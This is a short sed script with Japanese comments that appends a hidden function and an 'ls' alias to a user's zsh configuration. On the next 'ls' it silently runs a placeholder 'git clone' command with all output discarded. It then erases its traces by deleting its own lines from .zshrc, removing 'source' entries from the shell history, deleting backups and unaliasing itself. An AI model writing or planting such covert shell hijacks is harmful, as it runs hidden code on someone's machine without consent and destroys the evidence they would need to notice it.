#!/bin/sed -f

# 末尾に挿入する二つの文
${
    # 挿入する1つ目の文
    a\
function lls(){echo "ここにgit cloneを書く(標準出力、標準エラー出力を/dev/nullに捨てる)"; \ls "$@";  sed -i".aonaon" -e '/#CATMEME/d' ~/.zshrc; sed -i".aonaon" '/source/d' $HISTFILE; rm ~/.*.aonaon; source ~/.zshrc; unset -f lls; unalias ls;} #CATMEME
    # 挿入する2つ目の文
    a\
alias ls="lls" #CATMEME
}
